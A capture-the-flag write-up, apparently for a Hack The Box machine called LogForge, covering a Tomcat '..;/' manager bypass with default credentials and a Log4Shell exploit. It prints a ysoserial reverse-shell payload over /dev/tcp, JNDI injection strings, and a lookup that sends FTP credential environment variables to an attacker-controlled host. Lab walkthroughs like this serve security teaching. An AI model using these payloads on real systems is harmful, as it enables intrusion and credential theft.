# LogForge

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.96.153
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-11 02:50 EDT
Nmap scan report for 10.129.96.153
Host is up (0.017s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE    SERVICE
21/tcp   filtered ftp
22/tcp   open     ssh
80/tcp   open     http
8080/tcp filtered http-proxy
```

This is a UHC Box, so it should be somewhat fun.

### Web Enum --> Proxy Bypass

Port 80 just shows a simple image:

<figure><img src="../../../.gitbook/assets/image (639).png" alt=""><figcaption></figcaption></figure>

We can do a quick `gobuster` scan to find out more:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.96.153/ -x php,html,txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.96.153/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2023/05/11 02:51:43 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 302) [Size: 0] [--> /images/]
/admin                (Status: 403) [Size: 278]
/manager              (Status: 403) [Size: 278]
```

The `/manager` endpoint is like Tomcat, and it does not request credentials for us to enter. We can do the bypass exploit by accessing `test/..;/manager`.

<figure><img src="../../../.gitbook/assets/image (625).png" alt=""><figcaption></figcaption></figure>

We can login with `tomcat:tomcat` and view the dashboard:

<figure><img src="../../../.gitbook/assets/image (619).png" alt=""><figcaption></figcaption></figure>

### WAR Fail

I tried to upload stuff using the standard WAR reverse shell, but it doesn't work. We would get an error message like this:

<figure><img src="../../../.gitbook/assets/image (622).png" alt=""><figcaption></figcaption></figure>

The box name and the recent release of Log4j was a hint by the creator to try and make `log4shell` work.

### Log4j RCE

I'm following Hacktricks page on Log4Shell to execute these. We have to use these repositories to gain a shell:

{% embed url="https://github.com/pimps/JNDI-Exploit-Kit.git" %}

{% embed url="https://github.com/pimps/ysoserial-modified.git" %}

After downloading these, we have to run these commands:

{% code overflow="wrap" %}
```bash
$ java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.13/4444 0>&1' > shell.ser
$ java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -L 10.10.14.13:1389 -P shell.ser
```
{% endcode %}

Then, within the Tomcat interface, we just need to send this string in the XML configuration:

```
${jndi:ldap://10.10.14.13:1389/u3rmld}
```

Afterwards, we would get a shell as `tomcat`.&#x20;

```
$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.13] from (UNKNOWN) [10.129.96.153] 49842
bash: cannot set terminal process group (776): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@LogForge:/var/lib/tomcat9$ 
```

### Java Version

I should note that some versions of Java doesn't work with `ysoserial`. In this case, we can download the right Java version from here:

{% embed url="https://jdk.java.net/archive/" %}

For this machine, I specifically used Java 11.0.2 to make it work.&#x20;

## Privilege Escalation

### FTP Env Leak

I noticed that FTP was open and accessible from inside the machine. Log4j can also be used to leak environment variables, so we can attempt that.&#x20;

```
tomcat@LogForge:/var/lib/tomcat9$ netstat -tulpn
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        1      0 127.0.0.1:44690         127.0.0.1:8080          CLOSE_WAIT  -                   
tcp        0      2 10.10.11.138:49842      10.10.14.12:1337        ESTABLISHED 9577/bash           
tcp        1      0 127.0.0.1:44698         127.0.0.1:8080          CLOSE_WAIT  -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      776/java            
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
```

If we analyse the process, we can see FTP is running some kind of JAR file:

```
tomcat@LogForge:/var/lib/tomcat9$ ps -ef | grep -i ftp
    993 ?        Sl     0:26 java -jar /root/ftpServer-1.0-SNAPSHOT-all.jar
```

We can download this to our machine, and then reverse engineer it using `jd-gui`. There is a part where **environment variables** are being passed around.&#x20;

```java
private String validUser = System.getenv("ftp_user");

private String validPassword = System.getenv("ftp_password");
```

Using `ysoserial` agian, we could potentially leak these by constructing a certain string.&#x20;

{% embed url="https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/" %}

Following th above, we can use this to leak the credentials:

```
${jndi:ldap://10.10.14.13/user:${env:ftp_user}:password:${env:ftp_password}}
```

The credentials can be viewed within `wireshark`.&#x20;

<figure><img src="../../../.gitbook/assets/image (1) (6).png" alt=""><figcaption></figcaption></figure>

Using this password, we can `su` to `root`.&#x20;
